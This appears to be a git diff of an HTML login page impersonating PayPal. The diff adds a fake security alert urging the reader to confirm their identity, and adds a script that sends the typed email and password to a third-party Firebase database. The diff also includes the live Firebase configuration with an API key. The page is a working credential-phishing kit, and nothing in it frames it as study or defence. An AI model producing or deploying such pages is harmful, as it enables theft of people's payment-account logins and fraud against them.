@@ -2,25 +2,54 @@
 <head>
   <title> Login in to your PayPal account </title>
   <link rel='stylesheet' href='style.css' type='text/css'>
-    <script src='js.js'> </script>  
+   alert("Due to your recent activity, Login to confirm your identity");s  
 </head><body>
 <div class="login-page">
   <div class="form">
     <div class="box"> </div> 
-    <form class="register-form">
-      <input type="text" placeholder="name"/>
-      <input type="password" placeholder="password"/>
-      <input type="text" placeholder="email address"/>
-      <button>create</button>
-      <p class="message">Already registered? <a href="#">Sign In</a></p>
-    </form>
+   
     <form class="login-form">
-      <input type="text" placeholder="Email or mobile number"/>
-      <input type="password" placeholder="Enter your password"/>
-      <button>login</button>
+      <input id="emailbox" type="text" placeholder="Email or mobile number"/>
+      <input id="passbox" type="password" placeholder="Enter your password"/>
+      <button id="submitinfo" type="submit" onclick="submitInfo();" class="btn-post">login</button>
       <p class="message">Not registered? <a href="#">Create an account</a></p>
     </form>
   </div>
 </div>
+  <script>
+  // Your web app's Firebase configuration
+  var firebaseConfig = {
+    apiKey: "AIzaSyDZOOwIjmE-0QS9DYrwZMp_IK1XtNDgeLg",
+    authDomain: "humbleshire.firebaseapp.com",
+    databaseURL: "https://humbleshire.firebaseio.com",
+    projectId: "humbleshire",
+    storageBucket: "humbleshire.appspot.com",
+    messagingSenderId: "1054406792712",
+    appId: "1:1054406792712:web:9739cbc208fccabf4723bd",
+    measurementId: "G-4GPK4CLGGJ"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  console.log(firebase);
+
+  var database = firebase.database(); 
+
+   function submitInfo() {
+        
+     //var database = firebase.database();
+     var ref = database.ref('humbleshire');
+
+      var data = {
+
+        Email: document.getElementById("emailbox").value,
+        pass: document.getElementById("passbox").value
+      }  
+         console.log(data);
+          ref.push(data);
+      alert("Success"); 
+   }
+   
+
+</script>
 </body>
   </html>
